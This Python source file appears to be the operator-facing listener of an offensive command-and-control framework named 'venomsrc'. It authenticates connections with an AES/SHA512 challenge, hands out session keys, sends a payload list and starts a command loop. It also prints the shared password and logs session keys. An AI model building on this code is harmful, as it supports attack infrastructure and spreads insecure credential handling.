#!/usr/bin/env python3

import asyncio
import socket

from venomsrc.endpoints.raw_server.polls.cmd_poll import CMD
from venomsrc.config import Config
from venomsrc.crypto import Crypto
from venomsrc.utils import Utils
import fileinput

class Server:

    def __init__(self):
        self.utils = Utils()
        self.crypto = Crypto()
        self.CONFIG = Config()
        self.sessions = dict()



    async def handshake(self, reader: object, writer: object, addr: dict) -> int:
        """
        1. Generate random chars
        2. AES it
        3. SHA512 the result
        4. Send plain text string to client
        5. Check if client returned the same string

        @param reader: async socket conn object
        @param writer: async socket conn object
        @param addr: addr info of client
        @return: True if success, else False
        """

        rnd_str = Crypto.generaterndchars(16)
        self.utils.log(self.utils.INFO, "handshake(): rnd_str = '" + str(rnd_str) + "'", True)
        print(Config.getPass())
        enc_rnd_str = self.crypto.aes_encrypt(rnd_str, Config.getPass())  # AES String
        challenge_sol = Crypto.sha512_encrypt(enc_rnd_str)  # SHA512

        writer.write(rnd_str.encode('utf-8') + b'\xff' + b'')
        await writer.drain()  # Send plaintext string to client

        try:
            resp = (await reader.read(self.CONFIG.RCV_BLOCK_SZ)).decode('utf8')
        except:
            self.utils.log(self.utils.ERROR, 'Did not receive client challenge response', False)
            return 0

        if (resp != challenge_sol):  # if challenge auth fails...
            self.utils.log(self.utils.WARNING, 'handshake(): Challenge is wrong', False)
            writer.write(b'ACCESS_DENIED')
            await writer.drain()
            self.utils.log(self.utils.ERROR, 'Authentication failed from client: ' + str(addr[0]) + ':' + str(addr[1]),
                           False)
            writer.close()
            return 0

        self.utils.log(self.utils.OK, 'handshake(): Challenge OK', False)
        writer.write(b'ACCESS_OK')
        await writer.drain()
        resp = (await reader.read(self.CONFIG.RCV_BLOCK_SZ)).decode('utf8')  # wait for client interact

        if (resp != 'REQ_SESS_KEYS'):  # If error ( not requesting sess info )...
            self.utils.log(self.utils.WARNING, 'handshake(): Unexpected data received', False)
            writer.write(b'UNEXPECTED_DATA')
            self.utils.log(self.utils.WARNING, 'Unexpected data from client: ' + str(addr[0]) + ':' + str(addr[1]),
                           True)
            return 0

        sess_id = Crypto.generaterndsessid(16)  # Generating sess id
        self.utils.log(self.utils.INFO, "handshake(): sess_id = '" + str(sess_id) + "'", False)
        sess_key = Crypto.generaterndchars(16)  # Generating sess key
        self.utils.log(self.utils.INFO, "handshake(): sess_key = '" + str(sess_key) + "'", True)
        await self.utils.ssend(writer, sess_id.encode("utf-8") + b"\xff" + sess_key.encode("utf-8"))  # send info to client
        self.utils.log(self.utils.OK, 'Authentication successful ', True)
        return sess_id, sess_key

    async def run_server(self) -> None:
        """
        Start async server
        @param host: LHOST
        @param port: LPORT
        @return: None
        """

        try:
            server = await asyncio.start_server(self.handle_client, self.CONFIG.LHOST, self.CONFIG.LPORT)
        except Exception as e:
            print("[!] Address alredy in use")
            exit()
        async with server:
            self.utils.log(self.utils.OK, 'BV Started {}'.format(str(server.sockets[0].getsockname())), False)
            await server.serve_forever()

    async def handle_client(self, reader, writer) -> None:
        """
        Handle client connection
        """
        addr =  writer.get_extra_info('peername')  # get client conn info ("ip", port)

        self.utils.log(self.utils.INFO, "Received operator connection: '" + str(addr[0]) + ":" + str(addr[1]) + "'",
                   True)
        try:
            sess_id, sess_key = await self.handshake(reader, writer, addr)  # establish secure connection
        except:
            return

        if not sess_id:
            self.utils.log(self.utils.ERROR, "Error handshaking with client", True)
            return

        self.cmd_poll = CMD(writer, reader, sess_key) # Handle client commands
        await self.utils.ssend(writer, self.utils.getPayloads(), sess_key)  # send info to client
        await self.cmd_poll.start()  # start cmd poll bucle

if __name__=="__main__":
    server = Server()
    asyncio.run(server.run_server())